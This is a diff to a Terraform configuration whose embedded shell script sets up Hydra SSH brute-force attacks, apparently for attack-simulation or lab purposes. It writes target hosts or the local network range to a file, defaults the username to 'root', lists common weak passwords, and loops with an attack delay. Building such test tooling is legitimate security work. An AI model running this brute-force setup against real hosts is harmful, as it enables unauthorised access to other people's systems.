@@ -18,22 +18,22 @@ locals {
         log "LOCAL_NET: $LOCAL_NET"
         log "Targets: ${join(",", local.targets)}"
         echo "${ length(local.targets) > 0 ? join("\n", local.targets) : "$LOCAL_NET" }" > /tmp/hydra-targets.txt
-        cat > /tmp/hydra-users.txt <<-'EOF'
-        ${try(length(var.inputs["ssh_user"].username),"false") != "false" ? var.inputs["ssh_user"].username : "" }
-        EOF
-        cat > /tmp/hydra-passwords.txt <<-'EOF'
-        123456
-        123456789
-        111111
-        password
-        qwerty
-        abc123
-        12345678
-        password1
-        1234567
-        123123
-        ${try(length(var.inputs["ssh_user"].password),"false") != "false" ? var.inputs["ssh_user"].password : "" }
-        EOF
+        cat > /tmp/hydra-users.txt <<'EOF'
+    ${try(length(var.inputs["ssh_user"].username),"false") != "false" ? var.inputs["ssh_user"].username : "root" }
+    EOF
+        cat > /tmp/hydra-passwords.txt <<'EOF'
+    123456
+    123456789
+    111111
+    password
+    qwerty
+    abc123
+    12345678
+    password1
+    1234567
+    123123
+    ${try(length(var.inputs["ssh_user"].password),"false") != "false" ? var.inputs["ssh_user"].password : "" }
+    EOF
         if sudo docker ps -a | grep ${var.inputs["container_name"]}; then 
         sudo docker stop ${var.inputs["container_name"]}
         sudo docker rm ${var.inputs["container_name"]}
@@ -85,7 +85,7 @@ locals {
             break
         else
             log "restarting loop..."
-            log 'waiting ${var.inputs["attack_delay"]} seconds...';
+            log "waiting ${var.inputs["attack_delay"]} seconds...";
             sleep ${var.inputs["attack_delay"]}
         fi
     done
